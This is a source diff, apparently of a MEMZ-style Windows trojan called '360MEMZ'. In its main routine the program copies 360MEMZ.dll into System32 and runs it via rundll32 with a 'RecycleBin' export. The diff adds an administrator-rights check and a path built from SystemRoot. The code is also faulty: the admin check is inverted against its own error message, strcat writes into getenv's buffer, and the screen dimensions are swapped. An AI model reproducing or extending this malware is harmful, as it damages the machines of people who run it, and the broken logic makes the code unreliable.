@@ -132,8 +132,8 @@ DWORD WINAPI VideoThread(LPVOID lpParameter){
 }
 
 int main(){
-	if(!IsWin7OrLater()){
-		MessageBox(NULL, L"此程序需要Windows 7 及以上才能运行！", L"360MEMZ", MB_ICONERROR);
+	if((!IsWin7OrLater())||(IsUserAnAdmin())){
+		MessageBox(NULL, L"此程序需要Windows 7 及以上且拥有管理员权限才能运行！", L"360MEMZ", MB_ICONERROR);
 	}
 	scrh = GetSystemMetrics(SM_CXSCREEN), scrw = GetSystemMetrics(SM_CYSCREEN);
 	setlocale(LC_ALL, "chs");
@@ -166,8 +166,14 @@ int main(){
 		
 		Sleep(50);
 	}
-	
-	CopyFile(L"360MEMZ.dll",  L"C:\\Windows\\System32\\360MEMZ.dll", FALSE);
+
+
+const char *sysroot =strcat(getenv("SystemRoot"),"\\System32\\360MEMZ.dll") ;
+	WCHAR TempVar[256];
+	memset(TempVar,0,sizeof(TempVar));
+	MultiByteToWideChar(CP_ACP,0,sysroot,strlen(sysroot)+1,TempVar,
+		sizeof(TempVar)/sizeof(TempVar[0]));
+CopyFile(L"360MEMZ.dll",TempVar, FALSE);
 	Sleep(2000);
 	
 	ShellExecuteA(NULL, NULL, "rundll32.exe", "360MEMZ.dll,RecycleBin", NULL, SW_SHOWDEFAULT);
